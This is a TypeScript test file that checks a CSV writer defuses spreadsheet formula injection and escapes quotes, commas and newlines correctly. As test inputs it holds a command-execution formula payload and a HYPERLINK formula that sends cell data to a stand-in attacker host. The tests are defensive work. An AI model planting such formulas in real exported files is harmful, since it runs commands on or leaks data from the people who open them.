import { describe, it, expect } from 'vitest'
import { csvCell, csvDocument } from './csv'

/**
 * The browser's CSV writer.
 *
 * Three exporters each escaped quotes and stopped there, which is not a defence against
 * formula injection: a spreadsheet strips the CSV quotes on import and evaluates what is
 * left. The API has had this guard since the workspace export shipped; these tests hold the
 * browser side to the same rule, and to the thing that makes it worth having — the payload
 * is written by someone with far less access than the person who opens the file.
 */

/** The cell's contents as a spreadsheet would parse them: quotes stripped, doubles undone. */
const parsed = (cell: string) => cell.slice(1, -1).replace(/""/g, '"')

describe('csvCell — formula injection', () => {
  const leads = ['=', '+', '-', '@', '\t', '\r']

  it.each(leads)('neutralises a cell starting with %j', (lead) => {
    const cell = csvCell(`${lead}cmd|'/c calc.exe'!A1`)
    // The apostrophe is what makes the spreadsheet treat the rest as literal text.
    expect(parsed(cell).startsWith("'")).toBe(true)
  })

  it('neutralises the payload an attacker can actually plant', () => {
    /*
     * Not hypothetical. `POST /auth/login` stores the raw User-Agent on every attempt,
     * including a failed one, and a failure against a known member's address files that row
     * inside their workspace. It surfaces as the `device` column of the login-history
     * export, which an administrator downloads and opens. No account required.
     */
    const userAgent = '=HYPERLINK("https://evil.example/?x="&C2,"Details")'
    expect(parsed(csvCell(userAgent)).startsWith("'")).toBe(true)
  })

  it('leaves the value readable after defusing it', () => {
    // These are the customer's own records. Defusing a cell must not corrupt it.
    expect(parsed(csvCell('=SUM(A1:A2)'))).toBe("'=SUM(A1:A2)")
  })

  it('does not touch a value that was never dangerous', () => {
    expect(parsed(csvCell('Slip on ramp'))).toBe('Slip on ramp')
    expect(parsed(csvCell('PTW-4402'))).toBe('PTW-4402')
    expect(parsed(csvCell(42))).toBe('42')
  })

  it('guards a negative number without losing it', () => {
    // "-5" trips the rule because "-1+1" is arithmetic to a spreadsheet. The value survives;
    // the apostrophe is not displayed.
    expect(parsed(csvCell(-5))).toBe("'-5")
  })
})

describe('csvCell — escaping', () => {
  it('quotes every cell, as the exporters it replaces did', () => {
    // Keeping this means the fix changes which cells are dangerous, not what a file looks
    // like, so an existing export opens exactly as before.
    expect(csvCell('plain')).toBe('"plain"')
  })

  it('doubles an embedded quote so the field cannot be broken out of', () => {
    expect(csvCell('he said "no"')).toBe('"he said ""no"""')
  })

  it('keeps a comma or newline inside the field', () => {
    expect(csvCell('one,two')).toBe('"one,two"')
    expect(csvCell('line one\nline two')).toBe('"line one\nline two"')
  })

  it('renders null and undefined as empty, and keeps a real zero', () => {
    expect(csvCell(null)).toBe('""')
    expect(csvCell(undefined)).toBe('""')
    expect(csvCell(0)).toBe('"0"')
  })

  it('cannot be escaped by combining a quote with a formula lead', () => {
    // Both rules apply, in the order that matters: neutralise, then quote.
    const cell = csvCell('="a","b"')
    expect(parsed(cell)).toBe('\'="a","b"')
  })
})

describe('csvDocument', () => {
  it('writes a header then one line per row, CRLF throughout', () => {
    const doc = csvDocument(['Code', 'Title'], [['CA-1', 'Fix guard'], ['CA-2', 'Replace hose']])
    expect(doc).toBe('"Code","Title"\r\n"CA-1","Fix guard"\r\n"CA-2","Replace hose"')
  })

  it('applies the guard to headers as well as data', () => {
    // Column names are not always static — the competency matrix builds them from course
    // codes, which are customer data.
    const doc = csvDocument(['=EVIL()'], [['ok']])
    expect(doc.startsWith('"\'=EVIL()"')).toBe(true)
  })

  it('handles a document with no rows', () => {
    expect(csvDocument(['Code', 'Title'], [])).toBe('"Code","Title"')
  })
})
